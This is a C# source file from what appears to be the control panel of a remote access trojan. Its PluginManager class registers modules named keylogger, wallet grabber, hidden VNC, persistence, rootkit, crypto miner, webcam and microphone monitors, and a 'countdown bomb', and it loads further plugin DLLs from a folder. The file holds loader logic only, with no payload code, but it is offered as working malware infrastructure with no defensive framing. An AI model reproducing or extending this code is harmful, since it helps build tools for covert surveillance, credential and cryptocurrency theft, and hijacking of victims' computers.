// File: PluginManager.cs
#nullable disable

using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Versioning;
using System.Threading.Tasks;
using WpfApp.Plugins.Builtin;
using WpfApp.Plugins.Builtin.UpdatePlugin;

namespace WpfApp.Plugins
{
    [SupportedOSPlatform("windows")]
    public class PluginManager
    {
        private readonly PluginHost _host;
        private readonly MainWindow _ui;

        public PluginManager(MainWindow ui, PluginHost host)
        {
            _ui = ui;
            _host = host;
        }

        public async Task LoadAllPlugins()
        {
            if (!_host.LoadedPlugins.ContainsKey("shell"))
                await _host.LoadPlugin(new ShellPlugin());

            if (!_host.LoadedPlugins.ContainsKey("filemgr"))
                await _host.LoadPlugin(new FileManagerPlugin());

            if (!_host.LoadedPlugins.ContainsKey("regedit"))
                await _host.LoadPlugin(new RegistryPlugin());

            if (!_host.LoadedPlugins.ContainsKey("screenmon"))
                await _host.LoadPlugin(new ScreenMonitorPlugin());

            if (!_host.LoadedPlugins.ContainsKey("procmgr"))
                await _host.LoadPlugin(new ProcessManagerPlugin());

            if (!_host.LoadedPlugins.ContainsKey("keylog"))
                await _host.LoadPlugin(new KeyloggerPlugin());

            if (!_host.LoadedPlugins.ContainsKey("fun"))
                await _host.LoadPlugin(new FunPlugin());

            if (!_host.LoadedPlugins.ContainsKey("socks5"))
                await _host.LoadPlugin(new Socks5Plugin());

            if (!_host.LoadedPlugins.ContainsKey("walletgrab"))
                await _host.LoadPlugin(new WalletGrabPlugin());

            if (!_host.LoadedPlugins.ContainsKey("botkiller"))
                await _host.LoadPlugin(new BotKillerPlugin());

            if (!_host.LoadedPlugins.ContainsKey("micmon"))
                await _host.LoadPlugin(new MicMonitorPlugin());

            // Register UpdatePlugin
            if (!_host.LoadedPlugins.ContainsKey("update"))
                await _host.LoadPlugin(new Builtin.UpdatePlugin.UpdatePlugin());

            if (!_host.LoadedPlugins.ContainsKey("hvnc"))
                await _host.LoadPlugin(new HvncPlugin());

            if (!_host.LoadedPlugins.ContainsKey("persistence"))
                await _host.LoadPlugin(new PersistencePlugin());

            if (!_host.LoadedPlugins.ContainsKey("webcam"))
                await _host.LoadPlugin(new WebcamPlugin());

            if (!_host.LoadedPlugins.ContainsKey("countdown"))
                await _host.LoadPlugin(new CountdownBombPlugin());

            if (!_host.LoadedPlugins.ContainsKey("sysinfo"))
                await _host.LoadPlugin(new SystemInfoPlugin());

            if (!_host.LoadedPlugins.ContainsKey("miner"))
                await _host.LoadPlugin(new MinerPlugin());

            if (!_host.LoadedPlugins.ContainsKey("rootkit"))
                await _host.LoadPlugin(new RootkitPlugin());

            await LoadExternalPlugins();
        }

        private async Task LoadExternalPlugins()
        {
            string pluginDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Plugins");

            if (!Directory.Exists(pluginDir))
            {
                Directory.CreateDirectory(pluginDir);
                _host.Log($"Created plugins directory: {pluginDir}");
                return;
            }

            foreach (string dllPath in Directory.GetFiles(pluginDir, "*.dll"))
            {
                try
                {
                    _host.Log($"Loading plugin assembly: {Path.GetFileName(dllPath)}");

                    var assembly = Assembly.LoadFrom(dllPath);

                    var pluginTypes = assembly.GetTypes()
                        .Where(t => typeof(IServerPlugin).IsAssignableFrom(t)
                                    && !t.IsAbstract
                                    && !t.IsInterface)
                        .ToList();

                    if (pluginTypes.Count == 0)
                    {
                        _host.Log($"No IServerPlugin implementations found in {Path.GetFileName(dllPath)}.");
                        continue;
                    }

                    foreach (var pluginType in pluginTypes)
                    {
                        try
                        {
                            var plugin = (IServerPlugin)Activator.CreateInstance(pluginType);
                            if (!_host.LoadedPlugins.ContainsKey(plugin.PluginId))
                            {
                                await _host.LoadPlugin(plugin);
                            }
                        }
                        catch (Exception ex)
                        {
                            _host.Log($"Failed to instantiate {pluginType.Name}: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    _host.Log($"Failed to load assembly {Path.GetFileName(dllPath)}: {ex.Message}");
                }
            }
        }
    }
}